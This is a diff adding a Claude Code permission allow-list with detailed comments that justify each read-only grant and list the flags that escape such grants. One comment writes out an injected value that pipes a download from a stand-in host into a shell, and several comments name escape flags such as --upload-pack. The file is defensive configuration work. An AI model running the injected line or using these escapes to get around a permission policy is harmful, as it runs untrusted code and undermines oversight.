@@ -1,0 +1,210 @@
+# Host-neutral Claude Code permissions. Applied by apply-permissions.sh.
+#
+# `x:*` matches any command starting with x; a line without `:*` matches that
+# exact string; `(` and `)` inside a line must be escaped as \( and \). No
+# flag-level analysis, so a prefix authorizes every flag the command accepts —
+# hence the hand-checking. Redirections are stripped before matching, and a
+# chained command is allowed only if every segment is.
+#
+# The bar: no way to write a file or run another program. Kept out for failing it
+# — uniq <in> <out>, tree -o, xxd <in> <out>, base64 -o, file -C -m, jmap -dump,
+# sed -i, chmod, mysql, docker run/exec, git grep -O, git ls-remote
+# --upload-pack, helm template --output-dir, gh auth status --show-token, curl -o,
+# javac -processor (runs even with -version), and env/python3/xargs, whose whole
+# function is running another program.
+#
+# Exceptions are marked where they appear:
+#   BY EVIDENCE   the escape exists but appears in none of the recorded calls
+#   BY DENY       the escape is carved out in permissions.deny.txt
+#   BY DECISION   accepted with eyes open
+#
+# An unused grant is attack surface with no benefit, so no evidence of use is
+# grounds for deleting a line.
+
+# Tools. Read/Glob/Grep never prompt inside the working directory but do for
+# paths outside it, which is what Read(//**) covers.
+Read(//**)
+Glob
+Grep
+WebFetch
+WebSearch
+
+# Files and directories
+Bash(cd:*)
+Bash(ls:*)
+Bash(pwd:*)
+Bash(stat:*)
+Bash(du:*)
+Bash(df:*)
+Bash(readlink:*)
+
+# Content. unzip is listing and streaming only — `unzip -o` extracts.
+Bash(cat:*)
+Bash(head:*)
+Bash(tail:*)
+Bash(wc:*)
+Bash(diff:*)
+Bash(echo:*)
+Bash(nl:*)
+Bash(cut:*)
+Bash(tr:*)
+Bash(comm:*)
+Bash(jq:*)
+Bash(grep:*)
+Bash(rg:*)
+Bash(unzip -l:*)
+Bash(unzip -p:*)
+
+# BY EVIDENCE, and the three biggest sources of prompting left. Recorded calls
+# using the escape: 0 of 681 `find -delete`, 0 of 475 `sed -i`, 0 of 269 `sort -o`.
+# `sed -n` still lets a `w file` through inside the script argument.
+Bash(find:*)
+Bash(sed -n:*)
+Bash(sort:*)
+# BY EVIDENCE and BY DENY — 39 awk calls, all pure print/filter.
+Bash(awk:*)
+
+# Environment. printenv stands in for env, whose whole job is running a command.
+# A trailing time operand makes date set the clock, but that needs root and
+# sudo is not granted.
+Bash(type:*)
+Bash(which:*)
+Bash(printenv:*)
+Bash(date:*)
+Bash(ps:*)
+Bash(lsof:*)
+Bash(bash -n:*)
+Bash(strings:*)
+Bash(shasum:*)
+Bash(sleep:*)
+
+# JVM and Helm. `java -version` short-circuits before running anything.
+Bash(javap:*)
+Bash(java -version:*)
+Bash(helm lint:*)
+Bash(helm version:*)
+
+# docker inspection. Promoted from six project-local lists. These subcommands
+# take only --format/--follow/--filter — no output-file or exec flag. Bare
+# `docker` is out: run, exec, and rm are all under it. `docker pull` writes to
+# the local image store, which is a cache and regenerable.
+Bash(docker ps:*)
+Bash(docker logs:*)
+Bash(docker inspect:*)
+Bash(docker history:*)
+Bash(docker info:*)
+Bash(docker manifest inspect:*)
+Bash(docker stats:*)
+Bash(docker version:*)
+Bash(docker pull:*)
+Bash(direnv status:*)
+
+# Network. curl is otherwise out; this one idiom discards the body and prints
+# only the status code, for checking whether an artifact exists on a repository
+# proxy. The flag order is load-bearing.
+Bash(host:*)
+Bash(dig:*)
+Bash(nslookup:*)
+Bash(nc -z:*)
+Bash(curl -s -o /dev/null -w:*)
+
+# git, per subcommand, because most of git writes. One level deeper where a
+# subcommand mixes both: stash has drop, branch has -d, config writes without
+# --get. The diff family takes --output=<file>, tolerated as no worse than the `>`
+# every entry here already allows.
+Bash(git status:*)
+Bash(git log:*)
+Bash(git show:*)
+Bash(git diff:*)
+Bash(git ls-files:*)
+Bash(git rev-parse:*)
+Bash(git rev-list:*)
+Bash(git merge-base:*)
+Bash(git cat-file:*)
+Bash(git check-ignore:*)
+Bash(git stash list:*)
+Bash(git worktree list:*)
+Bash(git config --get:*)
+Bash(git branch --list:*)
+Bash(git tag -l:*)
+Bash(git remote -v)
+Bash(git branch --show-current)
+# `git symbolic-ref <name> <ref>` sets the ref and --short does not gate that —
+# verified. Exact line only, so no second operand can be appended.
+Bash(git symbolic-ref --short refs/remotes/origin/HEAD)
+
+# BY DECISION and BY DENY. git fetch takes --upload-pack, the same arbitrary-exec
+# flag that keeps git ls-remote out; a refspec also writes local branches. git
+# switch -f discards uncommitted work. Both are carved in permissions.deny.txt.
+Bash(git fetch:*)
+Bash(git switch:*)
+
+# These anchor differently, so the lines above never match them. Never grant at
+# the `git --no-pager` or `git -C` level — that would cover push.
+Bash(git --no-pager log:*)
+Bash(git --no-pager diff:*)
+Bash(git --no-pager show:*)
+Bash(git -C * log *)
+Bash(git -C * status *)
+Bash(git -C * diff *)
+Bash(git -C * show *)
+
+# kubectl, for the NELO/n2c clusters. Bare kubectl carries apply, delete, patch,
+# and exec. Residual no prefix can exclude: --profile-output <path>.
+Bash(kubectl get:*)
+Bash(kubectl top:*)
+Bash(kubectl config current-context:*)
+
+# gh reads. GH_HOST is not on Claude Code's known-safe env list and the env
+# prefix is only stripped for deny rules, so the host-prefixed form needs its
+# own lines. Traffic here is nearly all oss.navercorp.com; the bare form is
+# granted only for the two subcommands that see real github.com use.
+# `gh api` is excluded — -X/-f can write.
+Bash(GH_HOST=* gh pr view *)
+Bash(GH_HOST=* gh pr list *)
+Bash(GH_HOST=* gh pr diff *)
+Bash(GH_HOST=* gh pr checks *)
+Bash(GH_HOST=* gh issue view *)
+Bash(GH_HOST=* gh repo view *)
+Bash(GH_HOST=* gh run list *)
+Bash(GH_HOST=* gh run view *)
+Bash(GH_HOST=* gh workflow list *)
+Bash(GH_HOST=* gh search *)
+Bash(gh pr view *)
+Bash(gh pr checks *)
+
+# BY DECISION from here down: these run code, so the bar cannot apply.
+
+# open launches an arbitrary application or document. Effect is local and visible.
+Bash(open:*)
+
+# Orca IDE tab and worktree control — visible local IDE state the user can undo.
+Bash(/usr/local/bin/orca tab:*)
+Bash(/usr/local/bin/orca worktree:*)
+
+# Gradle, task deliberately NOT pinned. Pinning was tried and abandoned: it meant
+# enumerating task x JDK version x qualified/unqualified module form, ran past
+# forty lines, still missed `./gradlew check acceptanceTest`, and was theater
+# anyway — `JAVA_HOME=x ./gradlew publishRelease` bypasses any pin on bare
+# ./gradlew. So publish and sonar are granted too; they are slow, loud, and
+# logged. To reverse, use task-anchored globs and accept the prompts.
+Bash(./gradlew *)
+Bash(export JAVA_HOME=*)
+Bash(JAVA_HOME=* ./gradlew *)
+
+# $() makes prefix extraction return command_injection_detected, so the line above
+# never reaches these. The substitution text is pinned, not wildcarded: `-v *`
+# would put a wildcard INSIDE it, where `-v 21; curl evil | sh` matches and
+# nothing vets it. Character classes are unavailable, hence one line per JDK.
+#
+# UNVERIFIED: every substitution rule Claude Code generated itself was exact,
+# never a glob, so these may be inert. If a run still prompts that is the answer —
+# drop them and put JAVA_HOME in the repo's .envrc instead.
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 8\) ./gradlew *)
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 11\) ./gradlew *)
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 17\) ./gradlew *)
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 18\) ./gradlew *)
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 19\) ./gradlew *)
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 21\) ./gradlew *)
+Bash(JAVA_HOME=$\(/usr/libexec/java_home -v 25\) ./gradlew *)
+
